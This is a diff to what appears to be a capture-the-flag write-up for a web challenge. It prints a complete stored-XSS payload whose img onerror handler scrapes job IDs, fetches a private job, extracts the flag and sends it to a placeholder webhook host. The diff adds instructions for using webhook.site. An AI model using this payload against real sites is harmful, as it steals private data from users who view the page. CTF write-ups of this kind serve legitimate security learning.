@@ -50,11 +50,14 @@ Because the application page displays `why` verbatim (after this broken escape),
 4. Use XSS to request `/` to extract job IDs, then request the last (private) job, parse the flag from its description, and exfiltrate it.
 
 ## Payload
+### WEBHOOK
+Use https://webhook.site/ to get a webhook url and replace that with the YOUR-WEBHOOK to receive the flag when the link is visited.
+
 ```html
 '<x><img src=x onerror='fetch(`/`).then(r=>r.text()).then(t=>{const ids=[...t.matchAll(/\/job\/([0-9a-f-]{36})/g)].map(m=>m[1]);const id=ids[ids.length-1];return fetch(`/job/${id}`)}).then(r=>r.text()).then(t=>{const flag=t.match(/lactf\{[^}]+\}/)[0];(new Image()).src=`https://YOUR-WEBHOOK/?f=${encodeURIComponent(flag)}`})'>
 ```
 
-Replace `YOUR-WEBHOOK` with a request-catcher URL (e.g. webhook.site) and submit it as the application “Why/Bio/Resume”.
+Submit it as the application “Why/Bio/Resume” and you will see it would say visited then check the url for the webhook.
 
 ## Why this works
 - The XSS survives because only the first `<` is escaped.
